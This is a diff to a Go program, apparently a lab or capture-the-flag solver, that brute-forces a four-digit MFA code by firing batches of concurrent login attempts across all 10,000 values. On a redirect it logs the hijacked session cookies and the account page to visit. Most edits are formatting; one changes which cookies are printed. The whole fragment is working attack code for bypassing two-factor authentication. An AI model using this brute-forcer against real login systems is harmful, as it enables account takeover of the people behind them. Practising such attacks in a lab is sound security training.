@@ -25,15 +25,15 @@ func solve(hostname string) {
 	maxRoutines := 15 // Limits the number of routines to not overflow the number of sockets that can be open
 
 	for i := 0; i < 10000; i += maxRoutines {
-		for mfaCode := i; mfaCode < i + maxRoutines; mfaCode++ {
+		for mfaCode := i; mfaCode < i+maxRoutines; mfaCode++ {
 			mfaCodeAsString := fmt.Sprintf("%04d", mfaCode)
 			go attemptFlow(hostname, mfaCodeAsString, foundChannel, done)
 		}
-		for mfaCode := i; mfaCode < i + maxRoutines; mfaCode++ {
-			<- done
+		for mfaCode := i; mfaCode < i+maxRoutines; mfaCode++ {
+			<-done
 		}
 	}
-	<- foundChannel
+	<-foundChannel
 
 }
 
@@ -160,7 +160,11 @@ func fourthStep(hostname string, cookies []*http.Cookie, csrfToken string, mfaCo
 	}
 
 	if resp.StatusCode == http.StatusFound {
-		log.Printf("Use this csrfToken: %s - mfaCode: %s - cookies: %s", csrfToken, mfaCode, cookies)
+		log.Printf(
+			"Use the following cookies %s and go to: %s/my-account",
+			resp.Cookies(),
+			hostname,
+		)
 		return true
 	}
 
